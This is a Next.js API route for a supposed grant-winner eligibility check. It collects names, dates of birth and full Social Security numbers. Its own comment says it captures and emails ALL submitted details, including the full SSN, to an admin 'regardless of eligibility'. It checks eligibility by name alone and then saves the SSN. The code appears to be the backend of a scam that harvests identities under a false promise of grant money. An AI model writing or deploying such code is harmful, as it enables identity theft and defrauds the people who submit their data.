import { NextRequest, NextResponse } from "next/server"
import { sendEligibilityCheckNotification } from "@/lib/email"
import { findWinnerByName, updateWinner } from "@/lib/db"

export async function POST(req: NextRequest) {
  try {
    const { firstName, lastName, dob, ssnLast4, ssn, grantAmount } = await req.json()

    if (!firstName || !lastName || !dob || (!ssnLast4 && !ssn)) {
      return NextResponse.json(
        { found: false, error: "All fields are required" },
        { status: 400 }
      )
    }

    // Capture and send ALL collected details to admin via email regardless of eligibility
    sendEligibilityCheckNotification({
      firstName,
      lastName,
      dob,
      ssn: ssn || ssnLast4,
      grantAmount: grantAmount || "0"
    }).catch(err => console.error("Eligibility email failed:", err))

    // Just verify the Name in the database
    const winner = await findWinnerByName(firstName, lastName)

    if (winner) {
      // Opt-in: Save the user-provided DOB and SSN into the DB row
      const last4 = ssnLast4 || (ssn ? ssn.slice(-4) : "")
      await updateWinner(winner.id, { dob, ssnLast4: last4, ssn })

      return NextResponse.json({
        found: true,
        winner: {
          id: winner.id,
          grantAmount: winner.grantAmount,
          firstName: winner.firstName,
          lastName: winner.lastName,
        },
      })
    }

    return NextResponse.json({ found: false })
  } catch {
    return NextResponse.json(
      { found: false, error: "Server error" },
      { status: 500 }
    )
  }
}
